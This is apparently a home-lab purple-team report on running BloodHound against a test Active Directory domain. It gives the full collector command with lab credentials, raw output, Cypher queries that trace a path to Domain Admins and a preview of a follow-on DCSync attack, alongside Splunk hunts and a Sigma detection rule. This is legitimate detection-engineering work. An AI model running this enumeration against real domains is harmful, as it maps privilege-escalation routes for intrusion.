# ATK-005 — BloodHound AD Enumeration
**Sprint:** 1 | **Date:** 2026-04-26 | **Status:** COMPLETE  
**MITRE ATT&CK:** T1069.002 — Permission Groups Discovery: Domain Groups | T1087.002 — Account Discovery: Domain Account  
**Detection Rate: 0/3 (0%) — Fully Silent**

---

## 1. Overview

BloodHound is an Active Directory enumeration tool that uses graph theory to map every ACL, group membership, session, and trust relationship in a domain. It identifies attack paths that would be impossible to spot manually — revealing how an unprivileged user can reach Domain Admin through chains of misconfigurations.

In this attack, the attacker uses `bloodhound-python` (the Python-based ingestor) from Kali with `jsmith:Password123!` credentials obtained in ATK-002. The collector queries DC01 via LDAP and SMB, dumps the entire domain graph into 7 JSON files, and loads them into BloodHound CE for visual analysis.

**Key finding:** BloodHound automatically identified the complete kill chain:
```
JDOE → GenericAll → JSMITH → GetChanges → CORP.LOCAL → Domain Admins
```
This is the same path manually traced in ATK-004 — but found automatically in 2 seconds.

**Tool:** `bloodhound-python` (LDAP ingestor) + BloodHound CE v9.0.0  
**Credentials used:** `jsmith:Password123!`  
**Collection time:** 2 seconds  

---

## 2. Kill Chain Narrative

The attacker already holds `jsmith:Password123!` from ATK-002. Rather than manually querying AD attributes one by one (as done in ATK-003 and ATK-004), the attacker runs `bloodhound-python` which fires a burst of LDAP queries against DC01, collecting every user, group, computer, ACL, GPO, OU, and container in the domain. The resulting 7 JSON files are ingested into BloodHound CE running locally on Kali. A single Cypher query — "shortest path from jdoe to Domain Admins" — instantly draws the full attack chain, confirming the paths discovered manually across ATK-001 through ATK-004 and planning the DCSync attack in ATK-006.

---

## 3. Comparison: ATK-005 vs Previous Attacks

| Property | ATK-003/004 (Manual) | ATK-005 BloodHound |
|---|---|---|
| Method | Single targeted LDAP/Kerberos queries | Full domain graph dump via LDAP |
| Credential required | Valid domain user | Valid domain user |
| Time to find attack paths | Manual — minutes per path | Automated — 2 seconds total |
| Paths found | One at a time | All paths simultaneously |
| Detection | Silent (LDAP) | Silent (LDAP) |
| Output | Terminal text | Visual graph + JSON files |
| DC events generated | None | None (VIS-005 confirmed) |

---

## 4. Pre-Attack Setup

### RAM adjustment required
BloodHound CE requires ~1.8GB RAM on top of Kali base OS. Blue-vm (Splunk) was suspended to free RAM. Kali RAM increased from 2GB to 4GB in VMware settings.

| VM state during ATK-005 | Status |
|---|---|
| OPNsense | Running |
| DC01 | Running |
| blue-vm | **Suspended** (RAM constraint) |
| Kali (4GB) | Running |

> **Note:** No Splunk detection possible during this attack — blue-vm was offline. Detection analysis is based on known event behavior, not live observation.

---

## 5. Kill Chain Stages

### Stage 1 — Install bloodhound-python

```bash
pip install bloodhound --break-system-packages
```

**Output:** BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) installed.

---

### Stage 2 — Run domain collection

```bash
cd ~/corplab
mkdir -p bloodhound-atk005
cd bloodhound-atk005

bloodhound-python -u jsmith -p 'Password123!' -d corp.local -ns 10.10.10.40 -c all
```

**Output:**
```
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 6 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN11-PC.corp.local
INFO: Querying computer: DC01.corp.local
INFO: Done in 00M 02S
```

**Files generated:**
```
20260425182935_computers.json
20260425182935_domains.json
20260425182935_groups.json
20260425182935_users.json
20260425182935_containers.json
20260425182935_gpos.json
20260425182935_ous.json
```

**Detection:** ❌ None — LDAP queries generate no Security event log entries. VIS-005 confirmed.

---

### Stage 3 — BloodHound CE ingestion

BloodHound CE launched on Kali at `http://localhost:8080`. All 7 JSON files uploaded via Quick Upload. Ingestion completed in seconds.

**Detection:** ❌ None — local tool, no network activity.

---

### Stage 4 — Attack path discovery

**Cypher query run:**
```cypher
MATCH p=shortestPath((u:User {name:"JDOE@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

**BloodHound output — attack path graph:**

![BloodHound jdoe to Domain Admins path](bloodhound-jdoe-to-domainadmins.png)

*Screenshot: BloodHound CE Cypher query result showing the complete attack path from JDOE@CORP.LOCAL through GenericAll → JSMITH@CORP.LOCAL → GetChanges → CORP.LOCAL domain object → DOMAIN ADMINS@CORP.LOCAL*

**Full domain paths query:**
```cypher
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

**BloodHound output — full domain graph:**

![BloodHound full domain attack paths](bloodhound-full-domain-paths.png)

*Screenshot: Full domain graph showing all paths to Domain Admins, including ADMINISTRATOR@CORP.LOCAL MemberOf relationship and the complete jdoe→jsmith→DCSync chain*

**Complete attack chain confirmed by BloodHound:**
```
JDOE@CORP.LOCAL
    ↓ GenericAll (explicit, non-inherited ACE)
JSMITH@CORP.LOCAL
    ↓ GetChanges on domain object
CORP.LOCAL
    ↓ Contains
USERS@CORP.LOCAL
    ↓ Contains
DOMAIN ADMINS@CORP.LOCAL
        ↑
ADMINISTRATOR@CORP.LOCAL (MemberOf)
```

**Detection:** ❌ None — Cypher queries run locally, no network traffic.

---

### Stage 5 — Key findings from JSON analysis

Critical misconfigurations confirmed in raw JSON data:

**jdoe — AS-REP roastable:**
```json
"name": "JDOE@CORP.LOCAL",
"dontreqpreauth": true,
"enabled": true
```

**jdoe GenericAll over jsmith:**
```json
"ObjectIdentifier": "S-1-5-21-...-1103"  (jsmith)
"Aces": [
  {"RightName": "GenericAll", "IsInherited": false,
   "PrincipalSID": "S-1-5-21-...-1104",  (jdoe)
   "PrincipalType": "User"}
]
```

**jsmith GetChanges on domain (DCSync rights):**
```json
"RightName": "GetChanges",
"PrincipalSID": "S-1-5-21-...-1103"  (jsmith)
```

**svc-jenkins Kerberoastable:**
```json
"name": "SVC-JENKINS@CORP.LOCAL",
"serviceprincipalnames": ["HTTP/jenkins.corp.local"],
"hasspn": true,
"dontreqpreauth": false
```

**DC01 unconstrained delegation:**
```json
"name": "DC01.CORP.LOCAL",
"unconstraineddelegation": true
```

---

## 6. SOC Hunt

### T1 Triage — LDAP enumeration detection attempt

```spl
index=windows EventCode=4662
| search _raw="*LDAP*" OR _raw="*1131f6aa*"
| table _time, Account_Name, Object_Name
| sort -_time
```

**Result:** No hits specific to bloodhound-python LDAP queries — VIS-005 confirmed. LDAP enumeration is invisible without advanced LDAP audit logging.

### T2 — Look for volume of Kerberos TGT requests (indirect indicator)

```spl
index=windows EventCode=4768
| stats count by Account_Name, Client_Address
| where count > 5
| sort -count
```

**Result:** May show jsmith requesting multiple TGTs during collection but not conclusive.

### T2 — Check for any unusual LDAP bind activity

```spl
index=windows EventCode=4624 Logon_Type=3
| search Account_Name="jsmith"
| table _time, Account_Name, src_ip, Logon_Type
| sort -_time
```

**Result:** May show jsmith logon from Kali IP during collection window.

---

## 7. Detections Built

| # | Detection | Method | Event ID | Status |
|---|---|---|---|---|
| DET-005-01 | Honey account SPN enumeration | Honeypot SPN alert when queried | 4769 | 🔜 Sprint 4 |
| DET-005-02 | High volume LDAP queries from single source | LDAP audit logging | N/A | 🔜 Sprint 4 |
| DET-005-03 | BloodHound network signature | Suricata custom rule for BH patterns | N/A | 🔜 Sprint 4 (post VIS-001 fix) |

**No detections validated this attack** — this is the most dangerous gap in Sprint 1.

---

## 8. Visibility Gaps

| ID | Gap | Impact | Fix |
|---|---|---|---|
| VIS-005 | LDAP enumeration generates no Security event | BloodHound collection 100% silent | Honeypot SPNs + LDAP audit logging (Sprint 4) |
| VIS-007 (new) | No detection for BloodHound-specific LDAP patterns | Full domain mapping invisible | Suricata custom rule for BH LDAP fingerprint (Sprint 4, post VIS-001) |
| VIS-001 | Suricata blind to intra-LAN traffic | Can't inspect Kali→DC01 LDAP | vSwitch port mirroring (Sprint 4) |

---

## 9. Sigma Rule

```yaml
title: Potential BloodHound LDAP Enumeration — High Volume Domain Object Queries
id: atk005-bloodhound-ldap-enum-corp
status: experimental
description: >
  Detects potential BloodHound-style AD enumeration via high volume of
  Kerberos TGT requests from a single non-DC source in a short time window.
  Direct LDAP enumeration is silent — this rule catches the authentication
  artifact. True BloodHound detection requires LDAP audit logging or
  network-based signatures (see VIS-001, VIS-007).
author: CorpLab
date: 2026-04-26
references:
  - https://attack.mitre.org/techniques/T1069/002/
  - https://attack.mitre.org/techniques/T1087/002/
  - https://github.com/BloodHoundAD/BloodHound
tags:
  - attack.discovery
  - attack.t1069.002
  - attack.t1087.002
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
  filter_dc:
    IpAddress|startswith:
      - '::ffff:10.10.10.40'
      - '::ffff:10.10.10.1'
  timeframe: 30s
  condition: selection and not filter_dc | count() by IpAddress > 5
falsepositives:
  - Legitimate admin scripts performing domain queries
  - Monitoring tools polling Kerberos
level: medium
fields:
  - EventID
  - TargetUserName
  - IpAddress

# NOTE: This rule is a best-effort workaround. True BloodHound detection
# requires one of:
# 1. LDAP audit logging (Event ID 1644 — requires registry change on DC)
# 2. Network IDS signature on intra-LAN traffic (requires VIS-001 fix)
# 3. Honeypot SPNs that alert when queried
#
# SPL Translation:
# index=windows EventCode=4768
# | where NOT match(Client_Address, "::ffff:10\.10\.10\.(40|1)$")
# | bucket _time span=30s
# | stats count by _time, Client_Address
# | where count > 5
# | table _time, Client_Address, count
# | sort -count
```

---

## 10. MITRE ATT&CK Mapping

| Tactic | Technique | Sub-technique | ID | Detected |
|---|---|---|---|---|
| Discovery | Permission Groups Discovery | Domain Groups | T1069.002 | ❌ Silent |
| Discovery | Account Discovery | Domain Account | T1087.002 | ❌ Silent |
| Discovery | Domain Trust Discovery | — | T1482 | ❌ Silent |
| Collection | Data from Information Repositories | — | T1213 | ❌ Silent |

**Sprint 1 cumulative detection rate:**

| Attack | Stages | Detected | Rate |
|---|---|---|---|
| ATK-001 LLMNR Kill Chain | 7 | 5 | 71% |
| ATK-002 SMB Relay | 3 | 1 | 33% |
| ATK-003 Kerberoasting | 4 | 2 | 50% |
| ATK-004 AS-REP Roasting | 4 | 2 | 50% |
| ATK-005 BloodHound Enum | 3 | 0 | 0% |
| **Total Sprint 1 so far** | **21** | **10** | **48%** |

---

## 11. Lessons Learned

1. **BloodHound finds in 2 seconds what takes hours manually** — the jdoe→jsmith→DCSync chain discovered in ATK-004 was automatically identified the moment the JSON was ingested.
2. **LDAP enumeration is completely silent** — no Security event is generated for LDAP queries by default. This is the single biggest visibility gap in Sprint 1.
3. **RAM constraints are a real operational consideration** — BloodHound CE requires ~1.8GB RAM overhead. In a real engagement this would be run on a dedicated C2 server, not the attack box itself.
4. **JSON files are the real output** — the GUI is a viewer. The 7 JSON files contain the full domain graph and feed directly into the Sprint 5 RAG pipeline.
5. **BloodHound confirms every misconfiguration we set up** — dontreqpreauth, GenericAll ACL, GetChanges rights, Kerberoastable SPN, unconstrained delegation on DC01 all confirmed in raw data.
6. **Unconstrained delegation on DC01 is a new finding** — `unconstraineddelegation: true` on DC01 was not previously documented. This is a potential additional attack path (PrinterBug/Coercion → TGT capture). Added to backlog.
7. **Save BloodHound JSON files permanently** — copy to `~/corplab/bloodhound-atk005/` not `/tmp`. The files feed Sprint 5 RAG.

---

## 12. New Finding — DC01 Unconstrained Delegation

BloodHound flagged DC01 with `unconstraineddelegation: true`. This is normal for DCs but worth noting:

```json
"name": "DC01.CORP.LOCAL",
"unconstraineddelegation": true
```

In a real engagement this enables a **PrinterBug** attack — coerce DC01 to authenticate to Kali, capture the TGT, perform DCSync without needing jsmith's ACL rights at all. Added to backlog as potential ATK-008.

---

## 13. Next Attack Preview — ATK-006 DCSync via jsmith ACL

**Target:** `corp.local` domain — all hashes  
**Tool:** `impacket-secretsdump`  
**What it does:** Uses jsmith's `GetChanges` + `GetChangesAll` rights (confirmed by BloodHound) to replicate all password hashes from DC01 — mimicking a legitimate DC replication request  
**Key event:** EC4662 with GUID `1131f6aa` (GetChanges) and `1131f6ad` (GetChangesAll)  
**VMs needed:** Kali + DC01 + blue-vm  
**Note:** Restore blue-vm before running — we need Splunk for detection

---

## Appendix A — ATK-005.json

```json
{
  "attack_id": "ATK-005",
  "name": "BloodHound AD Enumeration",
  "sprint": 1,
  "date": "2026-04-26",
  "status": "complete",
  "mitre": [
    {
      "tactic": "Discovery",
      "technique": "Permission Groups Discovery",
      "sub_technique": "Domain Groups",
      "technique_id": "T1069.002"
    },
    {
      "tactic": "Discovery",
      "technique": "Account Discovery",
      "sub_technique": "Domain Account",
      "technique_id": "T1087.002"
    }
  ],
  "tool": "bloodhound-python + BloodHound CE v9.0.0",
  "attacker": {
    "host": "kali",
    "ip": "10.10.10.99",
    "creds_used": "jsmith:Password123!"
  },
  "target": {
    "domain": "corp.local",
    "dc": "DC01",
    "dc_ip": "10.10.10.40"
  },
  "collection_stats": {
    "domains": 1,
    "computers": 2,
    "users": 7,
    "groups": 53,
    "gpos": 6,
    "ous": 5,
    "containers": 19,
    "trusts": 0,
    "duration_seconds": 2
  },
  "files_generated": [
    "20260425182935_computers.json",
    "20260425182935_domains.json",
    "20260425182935_groups.json",
    "20260425182935_users.json",
    "20260425182935_containers.json",
    "20260425182935_gpos.json",
    "20260425182935_ous.json"
  ],
  "attack_paths_found": [
    {
      "path": "JDOE → GenericAll → JSMITH → GetChanges → CORP.LOCAL → DOMAIN ADMINS",
      "hops": 4,
      "start": "JDOE@CORP.LOCAL",
      "end": "DOMAIN ADMINS@CORP.LOCAL",
      "cypher": "MATCH p=shortestPath((u:User {name:'JDOE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p"
    }
  ],
  "key_misconfigurations_confirmed": [
    {"account": "jdoe", "misconfiguration": "dontreqpreauth=true", "attack": "ATK-004"},
    {"account": "jdoe", "misconfiguration": "GenericAll over jsmith", "attack": "ATK-006 enabler"},
    {"account": "jsmith", "misconfiguration": "GetChanges on domain object", "attack": "ATK-006"},
    {"account": "svc-jenkins", "misconfiguration": "Kerberoastable SPN HTTP/jenkins.corp.local", "attack": "ATK-003"},
    {"account": "DC01$", "misconfiguration": "unconstraineddelegation=true", "attack": "Potential ATK-008"}
  ],
  "stages": [
    {
      "stage": 1,
      "name": "bloodhound-python collection",
      "command": "bloodhound-python -u jsmith -p 'Password123!' -d corp.local -ns 10.10.10.40 -c all",
      "result": "7 JSON files generated — full domain graph captured in 2 seconds",
      "detected": false,
      "gap": "VIS-005"
    },
    {
      "stage": 2,
      "name": "BloodHound CE ingestion",
      "tool": "BloodHound CE v9.0.0",
      "result": "All 7 JSON files ingested successfully",
      "detected": false
    },
    {
      "stage": 3,
      "name": "Attack path query",
      "cypher": "MATCH p=shortestPath((u:User {name:'JDOE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p",
      "result": "Complete kill chain identified: jdoe→GenericAll→jsmith→GetChanges→CORP.LOCAL→Domain Admins",
      "detected": false,
      "gap": "VIS-005"
    }
  ],
  "detection_rate": "0/3 (0%)",
  "visibility_gaps": ["VIS-005", "VIS-007"],
  "new_gaps": [
    {
      "id": "VIS-007",
      "description": "No detection for BloodHound-specific LDAP enumeration patterns",
      "fix": "Suricata custom rule for BloodHound LDAP fingerprint — requires VIS-001 fix first"
    }
  ],
  "new_findings": [
    {
      "finding": "DC01 unconstraineddelegation=true",
      "impact": "Potential PrinterBug/coercion attack path — TGT capture without needing jsmith ACL",
      "priority": "backlog — ATK-008"
    }
  ],
  "screenshots": [
    "bloodhound-jdoe-to-domainadmins.png",
    "bloodhound-full-domain-paths.png"
  ],
  "rag_value": "high — 7 JSON files + this doc feed Sprint 5 ChromaDB directly",
  "next_attack": "ATK-006 DCSync via jsmith GetChanges rights"
}
```

---

## Appendix B — sigma_bloodhound_enum_T1069.002.yml

```yaml
title: Potential BloodHound LDAP Enumeration — High Volume Domain Object Queries
id: atk005-bloodhound-ldap-enum-corp
status: experimental
description: >
  Detects potential BloodHound-style AD enumeration via high volume of
  Kerberos TGT requests from a single non-DC source in a short time window.
author: CorpLab
date: 2026-04-26
references:
  - https://attack.mitre.org/techniques/T1069/002/
  - https://attack.mitre.org/techniques/T1087/002/
tags:
  - attack.discovery
  - attack.t1069.002
  - attack.t1087.002
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
  filter_dc:
    IpAddress|startswith:
      - '::ffff:10.10.10.40'
      - '::ffff:10.10.10.1'
  timeframe: 30s
  condition: selection and not filter_dc | count() by IpAddress > 5
falsepositives:
  - Legitimate admin scripts
  - Monitoring tools
level: medium
```
